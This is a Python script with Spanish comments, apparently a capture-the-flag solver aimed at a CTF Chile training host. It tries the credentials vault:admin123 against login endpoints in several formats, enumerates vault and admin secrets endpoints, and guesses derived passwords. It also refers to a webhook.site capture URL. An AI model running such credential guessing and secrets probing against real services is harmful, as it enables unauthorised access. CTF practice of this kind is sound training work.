#!/usr/bin/env python3
"""
CTF Chile - BÚSQUEDA DIRECTA DE FLAG CON CREDENCIALES VAULT
Usando vault:admin123 para encontrar la flag
"""
import requests
import json
import base64

TARGET = "http://training-pod2.ctfchile.com:32778"

print("🏆 BÚSQUEDA DIRECTA DE FLAG CON vault:admin123")
print("=" * 60)

def try_login_methods():
    """Probar diferentes métodos de login con vault:admin123"""

    methods = [
        # Método 1: JSON con password
        {
            "url": f"{TARGET}/api/login",
            "headers": {"Content-Type": "application/json"},
            "data": {"username": "vault", "password": "admin123"}
        },

        # Método 2: JSON con clave digital
        {
            "url": f"{TARGET}/api/login",
            "headers": {"Content-Type": "application/json"},
            "data": {"username": "vault", "claveDigital": "admin123"}
        },

        # Método 3: Basic Auth
        {
            "url": f"{TARGET}/api/login",
            "headers": {"Authorization": f"Basic {base64.b64encode(b'vault:admin123').decode()}"},
            "data": {}
        },

        # Método 4: Form data
        {
            "url": f"{TARGET}/api/login",
            "headers": {"Content-Type": "application/x-www-form-urlencoded"},
            "data": "username=vault&password=admin123"
        },

        # Método 5: Vault específico
        {
            "url": f"{TARGET}/vault",
            "headers": {"Content-Type": "application/json"},
            "data": {"user": "vault", "key": "admin123"}
        },

        # Método 6: API vault directa
        {
            "url": f"{TARGET}/api/vault",
            "headers": {"Content-Type": "application/json"},
            "data": {"username": "vault", "password": "admin123", "action": "list"}
        }
    ]

    for i, method in enumerate(methods):
        print(f"\n[{i+1}/6] Probando método {i+1}...")
        try:
            if isinstance(method["data"], dict):
                r = requests.post(method["url"],
                                headers=method["headers"],
                                json=method["data"],
                                timeout=10)
            else:
                r = requests.post(method["url"],
                                headers=method["headers"],
                                data=method["data"],
                                timeout=10)

            print(f"   Status: {r.status_code}")
            print(f"   Respuesta: {r.text[:200]}...")

            # Buscar flags en la respuesta
            response_text = r.text.lower()
            if "ctf{" in response_text or "flag{" in response_text:
                print(f"   🏆 FLAG ENCONTRADA EN RESPUESTA:")
                print(f"   {r.text}")

            # Si no es error 401/500, seguir explorando
            if r.status_code not in [401, 500] and len(r.text) > 50:
                print(f"   💡 Respuesta prometedora - explorando más...")
                return method["url"], method["headers"]

        except Exception as e:
            print(f"   Error: {e}")

    return None, None

def explore_endpoints(base_url, headers):
    """Explorar endpoints con credenciales válidas"""

    endpoints = [
        "/api/vault/secrets",
        "/api/vault/list",
        "/api/vault/status",
        "/api/admin/config",
        "/api/admin/secrets",
        "/vault/secrets",
        "/vault/list",
        "/admin/vault",
        "/secrets",
        "/config"
    ]

    print(f"\n🔍 Explorando endpoints con credenciales válidas...")

    for endpoint in endpoints:
        try:
            url = base_url.replace("/api/login", "") + endpoint
            r = requests.post(url,
                            headers=headers,
                            json={"username": "vault", "password": "admin123"},
                            timeout=5)

            print(f"   {endpoint}: {r.status_code}")
            if r.status_code != 404 and len(r.text) > 20:
                print(f"      Respuesta: {r.text[:150]}...")

                # Buscar flags
                if "ctf{" in r.text.lower() or "flag{" in r.text.lower():
                    print(f"   🏆 FLAG EN {endpoint}:")
                    print(f"   {r.text}")

        except Exception as e:
            print(f"   {endpoint}: Error - {e}")

# Ejecutar búsqueda
valid_url, valid_headers = try_login_methods()

if valid_url and valid_headers:
    explore_endpoints(valid_url, valid_headers)

# Probar clave digital derivada de admin123
print(f"\n🗝️ Probando claves digitales derivadas de admin123...")

import hashlib
admin_variants = [
    "admin123",
    "123admin",
    "admin",
    "123",
    hashlib.md5(b"admin123").hexdigest()[:8],
    hashlib.md5(b"vault").hexdigest()[:8],
    str(hash("admin123") % 1000000),
    "admin123".encode().hex(),
]

for variant in admin_variants:
    try:
        r = requests.post(f"{TARGET}/api/login",
                         headers={"Content-Type": "application/json"},
                         json={"username": "vault", "claveDigital": variant},
                         timeout=5)

        print(f"   Clave '{variant}': {r.status_code}")
        if r.status_code != 401 and "incorrecta" not in r.text:
            print(f"   🎯 POSIBLE ÉXITO CON CLAVE: {variant}")
            print(f"   Respuesta: {r.text}")

    except:
        pass

print(f"\n🎯 BÚSQUEDA COMPLETADA")
print("Si no aparecieron flags arriba, revisa los webhooks manualmente:")
print("• https://webhook.site/#!/300bbadc-4b48-4608-bbf0-1c2b19d4f909")
print("=" * 60)